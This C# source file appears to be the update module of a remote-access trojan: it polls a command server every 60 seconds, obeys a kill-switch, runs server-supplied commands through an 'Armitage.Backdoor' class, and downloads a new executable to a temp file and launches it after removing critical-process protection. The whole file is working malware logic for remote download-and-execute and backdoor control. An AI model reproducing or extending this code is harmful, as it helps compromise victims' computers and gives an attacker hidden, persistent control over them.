using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Client.Utilities
{
    /// <summary>
    /// A class that checks for updates every 60 seconds.
    /// </summary>
    public class Updater
    {
        private System.Timers.Timer _refreshtimer;
        private float FetchedVersion = 0f;
        public void Start()
        {
            _refreshtimer = new System.Timers.Timer();
            _refreshtimer.Interval = 60 * 1000;
            _refreshtimer.Elapsed += _refreshtimer_Elapsed;
            _refreshtimer.Start();
        }

        private void _refreshtimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            FetchUpdates();
        }

        public async void FetchUpdates()
        {
            await Task.Run(() =>
            {   // todo
                var update_data = Communication.Server.GetUpdate();

                // check if the letter is supposed to kill itself.
                if (update_data.KillSelf) Environment.Exit(69);

                if (update_data!= null && FetchedVersion != update_data.UpdateVersion)
                {
                    // its a new update, initialize it
                    FetchedVersion = update_data.UpdateVersion;

                    Armitage.Backdoor bd = new Armitage.Backdoor(update_data.Runnables);
                    bd.Execute(); // async

                    if (update_data.LetterVersion > Constants.Version)
                    {
                        DownloadAndRunNewLetter(update_data.DownloadLink);
                    }
                }
            });
        }

        /// <summary>
        /// Downloads the newest letter.
        /// </summary>
        public async void DownloadAndRunNewLetter(string link)
        {
            string target_filename = Path.GetTempFileName() + ".exe";

            target_filename =
                await Communication.Server.AsyncDownloadFile(link, target_filename);

            if (!string.IsNullOrEmpty(target_filename))
            {
                // unprotect (very dangerous)
                if (Armitage.Critical_Process.IsProtected)
                    Armitage.Critical_Process.Unprotect();

                try
                {
                    Process.Start(target_filename, Constants.MyProcessID.ToString());
                    // wait for 10 seconds, wait until the new Love Letter
                    // do its thing
                    Thread.Sleep(10 * 1000);
                }
                catch { }
            }
            // if nothing happened just continue stalking
        }
    }
}
